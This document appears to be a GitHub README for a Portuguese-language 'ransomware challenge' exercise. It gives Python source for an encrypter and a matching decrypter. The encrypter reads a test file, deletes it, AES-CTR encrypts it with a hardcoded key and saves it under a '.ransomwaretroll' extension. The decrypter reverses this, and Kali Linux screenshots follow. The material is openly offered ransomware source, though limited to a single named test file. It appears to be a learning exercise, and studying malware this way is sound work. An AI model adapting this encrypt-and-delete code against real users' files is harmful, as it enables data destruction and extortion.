# DesafioRansomware
## código para decrypter

import os

import pyaes

### abrir o arquivo criptografado
file_name = "teste.txt.ransomwaretroll"

file = open(file_name, "rb")

file_data = file.read()

file.close()

### chave para descriptografia
key = b"testeransomwares"

aes = pyaes.AESModeOfOperationCTR(key)

decrypt_data = aes.decrypt(file_data)

### remover o arquivo criptografado
os.remove(file_name)

### criar o arquivo descriptografado
new_file = "teste.txt"

new_file = open(f'{new_file}', "wb")

new_file.write(decrypt_data)

new_file.close()

## código para encrypter

import os

import pyaes

### abrir o arquivo a ser criptografado
file_name = "teste.txt"

file = open(file_name, "rb")

file_data = file.read()

file.close()

### remover o arquivo
os.remove(file_name)

### chave de criptografia
key = b"testeransomwares"

aes = pyaes.AESModeOfOperationCTR(key)

### criptografar o arquivo
crypto_data = aes.encrypt(file_data)

### salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"

new_file = open(f'{new_file}','wb')

new_file.write(crypto_data)

new_file.close()

### teste.txt
 
  este arquivo esta descriptografado




![kaliransom1](https://github.com/Matos97/DesafioRansomware/assets/168843291/51491a41-0136-45fc-b90f-c97454070878)

![kaliransom2](https://github.com/Matos97/DesafioRansomware/assets/168843291/a71e1c9c-5bd9-45d7-8409-04afd7125a7c)
![kaliransom3](https://github.com/Matos97/DesafioRansomware/assets/168843291/333949f6-3fc4-4158-a3be-4fa1e1b86ec8)
![kaliransom4](https://github.com/Matos97/DesafioRansomware/assets/168843291/a5076590-db30-4d31-9e7d-ea2072a41c48)
![kaliransom5](https://github.com/Matos97/DesafioRansomware/assets/168843291/6d41b7f6-4a34-48c2-9092-378c9b30916b)
